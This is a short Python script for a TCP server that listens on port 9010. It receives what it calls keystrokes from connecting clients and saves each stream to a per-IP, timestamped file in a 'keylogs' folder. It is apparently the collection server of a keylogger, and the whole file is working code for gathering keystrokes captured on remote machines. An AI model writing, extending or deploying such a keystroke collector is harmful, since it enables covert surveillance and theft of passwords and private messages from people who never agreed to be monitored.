import socket
import os
import datetime

def initialize_socket(port):
    # Create a socket object
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Bind the socket to a specific address and port
        server_socket.bind(('', port))
        # Listen for incoming connections
        server_socket.listen(1)
        print(f"Server listening on port {port}")
        return server_socket
    except socket.error as e:
        print(f"Failed to initialize socket: {str(e)}")
        return None

def receive_keystrokes(client_socket, log_file_path):
    try:
        while True:
            data = client_socket.recv(1024).decode('utf-8')
            if not data:
                break
            print(f"Received keystrokes: {data}")
            # Write the received keystrokes to the log file
            with open(log_file_path, 'a') as log_file:
                log_file.write(data)
                log_file.flush()  # Flush the buffer to ensure immediate writing
    except socket.error as e:
        print(f"Error receiving data: {str(e)}")

def main():
    port = 9010  # Specify the port to listen on

    server_socket = initialize_socket(port)
    if server_socket is None:
        return

    try:
        while True:
            # Accept incoming connection
            client_socket, address = server_socket.accept()
            print(f"Connected to {address[0]}:{address[1]}")

            # Create the keylogs directory if it doesn't exist
            if not os.path.exists('keylogs'):
                os.makedirs('keylogs')

            # Generate the log file path based on client address and current timestamp
            timestamp = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
            log_file_path = os.path.join('keylogs', f"{address[0]}-{timestamp}.txt")

            # Receive and process keystrokes data
            receive_keystrokes(client_socket, log_file_path)

            # Close the connection
            client_socket.close()
            print("Connection closed")
    except KeyboardInterrupt:
        pass
    finally:
        server_socket.close()

if __name__ == '__main__':
    main()
